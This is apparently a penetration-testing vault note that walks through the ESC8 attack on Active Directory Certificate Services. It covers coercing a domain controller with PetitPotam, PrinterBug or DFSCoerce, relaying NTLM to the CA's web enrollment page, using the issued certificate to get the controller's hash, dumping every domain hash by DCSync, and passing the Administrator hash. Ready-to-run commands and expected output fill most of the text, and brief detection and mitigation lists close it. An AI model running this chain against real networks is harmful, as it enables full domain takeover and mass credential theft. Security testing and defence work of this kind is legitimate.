---
title: "ESC8 — NTLM Relay to ADCS HTTP Web Enrollment"
description: "ESC8 is a network-level NTLM relay attack against the ADCS Web Enrollment HTTP interface. Every ESC attack up to this point required you to already have…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "credential-access", "ntlm", "relay"]
tools: ["Impacket", "Mimikatz", "Rubeus", "Certipy", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC8 — NTLM Relay to ADCS HTTP Web Enrollment.md"
---
# ESC8 — NTLM Relay to ADCS HTTP Web Enrollment

## What Is ESC8?

ESC8 is a **network-level NTLM relay attack** against the ADCS Web Enrollment HTTP interface. Every ESC attack up to this point required you to already have domain credentials and be abusing template or CA misconfigurations. ESC8 is fundamentally different — you **intercept or coerce an authentication attempt from a privileged machine** (like a Domain Controller), relay those NTLM credentials to the CA's web enrollment endpoint, and trick the CA into issuing a certificate for that high-privilege machine account.

The result: you get a certificate for `DC01$` (the DC's machine account). With that certificate you can retrieve the DC's NT hash via PKINIT, then perform a **DCSync** — full domain compromise without ever knowing a single password.

This attack combines **three techniques** into one chain:
1. **Coercion** — Force a privileged machine to authenticate to you
2. **NTLM Relay** — Relay those credentials to the CA web enrollment endpoint
3. **Certificate Abuse** — Use the issued cert to authenticate as the coerced machine

***

## Required Conditions

| Condition | Where to Check |
|-----------|----------------|
| **Web Enrollment is enabled** on CA | CA output: `Web Enrollment: Enabled` |
| HTTP (not HTTPS only) endpoint accessible | `http://<CA>/certsrv/` responds |
| **Extended Protection for Authentication (EPA) disabled** | Default IIS config — not enabled by default  |
| **Request Disposition: Issue** | CA output: `Request Disposition: Issue` |
| At least one template allowing **Machine/Computer authentication** | `DomainController`, `Machine`, `Computer` templates |
| NTLM not blocked on the network | SMB signing may be relevant for coercion path |

***

## Step 0 — Enumeration

```bash
# Standard certipy scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout

# Check if web enrollment HTTP endpoint is alive
curl -k http://<CA-IP>/certsrv/
# If it returns an IIS/Windows auth page = vulnerable
```

### What Vulnerable ESC8 Output Looks Like

```
Certificate Authorities
  0
    CA Name                             : DOMAIN-CA
    DNS Name                            : DC01.domain.htb
    Web Enrollment
      HTTP
        Enabled                         : True          ← ⚠️ KEY FLAG
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue          ← No manual approval
    Enforce Encryption for Requests     : Disabled

    [!] Vulnerabilities
      ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue
```

> 💡 If you see `HTTP Enabled: False` and `HTTPS Enabled: False` (like your Fluffy box showed for `fluffy-DC01-CA`), then ESC8 is **not available** — the web enrollment endpoint is off. This is why Fluffy needed ESC16 instead.

***

## Understanding the Attack Topology

Before running commands, understand what is happening on the network:

```
[YOUR ATTACK BOX]          [DOMAIN CONTROLLER]         [CA / ADCS SERVER]
        │                          │                           │
        │  1. Set up relay         │                           │
        │  ntlmrelayx listening    │                           │
        │                          │                           │
        │  2. Coerce DC auth       │                           │
        │  PetitPotam/PrintSpooler │                           │
        │─────────────────────────►│                           │
        │                          │ NTLM Auth triggered       │
        │◄─────────────────────────│                           │
        │  3. Relay NTLM to CA     │                           │
        │─────────────────────────────────────────────────────►│
        │                          │       CA issues DC01$.pfx │
        │◄─────────────────────────────────────────────────────│
        │  4. Authenticate as DC01$                            │
        │  certipy auth -pfx dc01.pfx                          │
        │─────────────────────────►│                           │
        │  5. DCSync (dump all hashes)                         │
        │─────────────────────────►│                           │
```

***

## Full Attack Chain — Linux (Certipy + ntlmrelayx + PetitPotam)

### Step 1 — Set Up the NTLM Relay Listener

Open **Terminal 1** — this stays running throughout:

```bash
# Relay to the CA's web enrollment endpoint
# -t = target (CA web enrollment URL)
# --adcs = tells ntlmrelayx to request a certificate
# --template = which template to request (DomainController for DC machine accounts)

impacket-ntlmrelayx \
  -t http://<CA-IP>/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController'

# If the CA is on the same host as the DC:
impacket-ntlmrelayx \
  -t http://DC01.domain.htb/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController'
```

> 💡 `--template DomainController` is specifically for coercing DCs. If you're targeting a regular machine account use `--template Machine`. If targeting a user account use `--template User`.

***

### Step 2 — Coerce Authentication from the Domain Controller

Open **Terminal 2** — trigger the DC to authenticate to you.

**Method A — PetitPotam (most reliable, CVE-2021-36942 / MS-EFSRPC):**
```bash
# Unauthenticated version (pre-patch)
python3 PetitPotam.py <YOUR-IP> <DC-IP>

# Authenticated version (post-patch, still works if you have creds)
python3 PetitPotam.py \
  -u 'lowpriv' \
  -p 'Password123!' \
  -d 'domain.htb' \
  <YOUR-IP> <DC-IP>
```

**Method B — PrinterBug / SpoolSample (Print Spooler abuse):**
```bash
python3 printerbug.py 'domain.htb/lowpriv:Password123!'@<DC-IP> <YOUR-IP>
```

**Method C — DFSCoerce (MS-DFSNM):**
```bash
python3 dfscoerce.py -u 'lowpriv' -p 'Password123!' -d 'domain.htb' <YOUR-IP> <DC-IP>
```

**Method D — Certipy's built-in relay (newer versions):**
```bash
# Certipy v5+ has integrated relay support
certipy-ad relay -ca <CA-IP> -template DomainController
# Then coerce separately with PetitPotam
```

***

### Step 3 — Collect the Certificate (Watch Terminal 1)

After coercion, watch Terminal 1 (ntlmrelayx) output:

```
[*] SMBD-Thread-4: Connection from DC01$@<DC-IP> controlled, attacking target http://<CA-IP>
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://<CA-IP> as DOMAIN/DC01$ SUCCEED
[*] ADCS: Getting certificate...
[*] ADCS: Got certificate with UPN 'DC01$@domain.htb'
[*] ADCS: Saved certificate and private key to 'DC01$.pfx'  ← ⚠️ This is your weapon
```

> 💡 The file will be named after the machine account — typically `DC01$.pfx`. The `$` suffix denotes a machine account.

***

### Step 4 — Authenticate as the DC Machine Account

```bash
certipy-ad auth \
  -pfx 'DC01$.pfx' \
  -username 'DC01$' \
  -domain domain.htb \
  -dc-ip $TARGET
```

**Expected output:**
```
[*] Using principal: 'DC01$@domain.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'DC01$.ccache'
[*] Trying to retrieve NT hash for 'DC01$'
[*] Got hash for 'DC01$@domain.htb': aad3b435b51404eeaad3b435b51404ee:NTHASH
```

***

### Step 5 — DCSync (Dump All Domain Hashes)

With the DC machine account's TGT or hash, you have **replication rights** — meaning you can perform a DCSync to pull every single hash in the domain:

```bash
# Using the TGT
export KRB5CCNAME='DC01$.ccache'
secretsdump.py -k -no-pass DC01.domain.htb

# Using the NT hash directly
secretsdump.py \
  -hashes :NTHASH \
  'domain.htb/DC01$'@DC01.domain.htb

# Output includes ALL domain hashes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3...
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGT_HASH...
# All user NT hashes...
```

***

### Step 6 — Pass-the-Hash as Administrator

```bash
# With Administrator's NT hash from DCSync
evil-winrm -i $TARGET -u administrator -H <ADMIN_NTHASH>
wmiexec.py administrator@$TARGET -hashes :ADMIN_NTHASH
psexec.py administrator@$TARGET -hashes :ADMIN_NTHASH
```

***

## Full Attack Chain — Windows (Rubeus + ntlmrelayx)

```powershell
# This attack is primarily Linux-based due to tooling
# On Windows, you would need:

# Step 1: Use Inveigh for relay (PowerShell NTLM relay)
Import-Module .\Inveigh.ps1
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target http://<CA-IP>/certsrv/certfnsh.asp

# Step 2: Coerce via PrinterBug from Windows
.\SpoolSample.exe <DC-IP> <YOUR-IP>

# Step 3: Convert base64 cert from Inveigh output
# Import and use with Rubeus
.\Rubeus.exe asktgt /user:DC01$ /certificate:<base64cert> /getcredentials /nowrap

# Step 4: DCSync
.\Mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit
```

***

## ESC8 Visual Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│  PREREQUISITE CHECK                                             │
│  certipy find → Web Enrollment: Enabled + Disposition: Issue   │
└─────────────────────────────────────────────────────────────────┘
                          │
         ┌────────────────▼────────────────┐
         │ Terminal 1: ntlmrelayx          │
         │ -t http://<CA>/certsrv/...      │
         │ --adcs --template DomainController│
         │ LISTENING...                    │
         └────────────────┬────────────────┘
                          │
         ┌────────────────▼────────────────┐
         │ Terminal 2: PetitPotam/coerce   │
         │ Force DC01$ → auth to YOUR-IP  │
         └────────────────┬────────────────┘
                          │
         ┌────────────────▼────────────────┐
         │ ntlmrelayx relays to CA HTTP    │
         │ CA issues DC01$.pfx             │
         └────────────────┬────────────────┘
                          │
         ┌────────────────▼────────────────┐
         │ certipy auth -pfx DC01$.pfx     │
         │ → TGT + NT hash for DC01$       │
         └────────────────┬────────────────┘
                          │
         ┌────────────────▼────────────────┐
         │ secretsdump DCSync              │
         │ → ALL domain hashes             │
         └────────────────┬────────────────┘
                          │
                    [DOMAIN OWNED]
```

***

## ESC8 vs All Previous ESCs

| | ESC1–4 | ESC6–7 | **ESC8** |
|---|---|---|---|
| **Requires domain creds to start** | ✅ | ✅ | ⚠️ May not need (unauthenticated coercion) |
| **Attack surface** | Certificate Templates | CA configuration | **Network / HTTP** |
| **Key tool** | `certipy req` | `certipy ca` | **ntlmrelayx + PetitPotam** |
| **What you steal** | Certificate for a user | Certificate for a user | **Certificate for a machine account** |
| **Post-exploitation** | PTH / TGT | PTH / TGT | **DCSync → full domain** |
| **Noisiness** | Medium | Medium | **High — network coercion is loud** |

***

## Troubleshooting Common Issues

| Error | Cause | Fix |
|-------|-------|-----|
| `ntlmrelayx` gets connection but CA returns 401 | EPA enforced on IIS | Confirm with `curl -v http://<CA>/certsrv/` — if NTLM is listed but fails, EPA may be on |
| PetitPotam fails | DC patched for unauthenticated EFS | Use authenticated version with `-u/-p`, or switch to PrinterBug/DFSCoerce |
| Got cert but `certipy auth` fails | Template mismatch — got cert for wrong account type | Verify cert UPN with `certipy cert -pfx DC01$.pfx` |
| `certsrv` URL not reachable | Web enrollment not on port 80 or CA is different host | Try HTTPS port 443, or confirm CA hostname from certipy find output |
| Relay times out | DC coercion succeeded but DC can't reach your IP | Check firewall rules — DC must be able to reach YOUR-IP on TCP 445 and 80 |

***

## Detection Indicators

- **Event ID 4768/4769** — Kerberos TGT requested for a machine account from an unusual source IP
- **Event ID 4887** — Certificate issued for a machine account via web enrollment
- **IIS logs on CA** — `POST /certsrv/certfnsh.asp` requests from IP addresses that are not the machine account's own IP — the relay source IP will differ from the machine account's actual IP
- **Net logon anomalies** — A DC machine account authenticating to an unexpected host
- **Sysmon Event ID 3** — Network connection from `lsass.exe` to an unusual target

***

## Mitigation

- **Enforce HTTPS** on the Web Enrollment endpoint and disable HTTP entirely
- **Enable Extended Protection for Authentication (EPA)** on IIS for the `certsrv` application — this binds NTLM auth to the TLS channel, breaking the relay
- **Disable Web Enrollment** entirely if not needed — most orgs can use RPC-based enrollment instead
- **Block NTLM** where possible — or enforce **SMB signing** on all machines to prevent coercion-based relay
- **Patch CVE-2021-36942** — removes unauthenticated PetitPotam coercion
- **Restrict which templates machine accounts can enroll in** via CA enrollment agent restrictions

***

Ready for **ESC11** whenever you say go, Netrunner.

Sources
 Enumerating Ad Cs And... https://www.linkedin.com/pulse/esc8-attack-exploiting-adcs-domain-dominance-krishnendu-de-ijaqc
 ADCS ESC8 – NTLM Relay to AD CS HTTP Endpoints https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
 ESC8 is a critical vulnerability in Active Directory Certificate Services https://anantis.io/esc8/
 ESC8 Attack Guide for Windows Environments - Sentry Blog https://blog.sentry.security/esc8-attack-guide-for-windows-environments-2/
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 Active Directory Certificate Attack: ESC8 - ADCS https://www.rbtsec.com/blog/active-directory-certificate-attack-esc8-adcs-web-enrollment/
 Closing the ESC8 Vulnerability in Active Directory Certificate Services https://www.avertium.com/blog/escalation-8-how-to-close-a-commonly-exploited-active-directory-certificate-services-elevation-of-privilege-vulnerability
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt2/
 How Certificates became AD's Biggest Attack Surfaces https://silverbackcyber.io/2026/02/23/adc-active-directorys-biggest-attack-surfaces/
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Understanding Active Directory Certificate Services: A Focus on ... https://trustfoundry.net/2024/08/19/understanding-active-directory-certificate-services-a-focus-on-esc1-and-esc8/
 Abusing Active Directory Certificate Services (ADCS) | ESC8 Attack ... https://www.youtube.com/watch?v=pVezmVSCJGk
 ESC8 exploits misconfigured Active Directory Certificate Services ... https://www.linkedin.com/posts/hendryadrian_activedirectory-ntlmrelay-activity-7335272144282468352-XXnH
 ADCS ESC8 Tutorial | Attack Active Directory Certificate Services https://www.youtube.com/watch?v=QUTXge-9lRo
 Mitigating ESC1 and ESC8 Vulnerability in Active Directory https://www.encryptionconsulting.com/mitigating-esc1-and-esc8-vulnerability-in-active-directory/
 Exploiting Active Directory Certificate Services (ADCS) Using Only ... https://www.youtube.com/watch?v=FhJpfWZ6NQA
 Silver Ticket https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
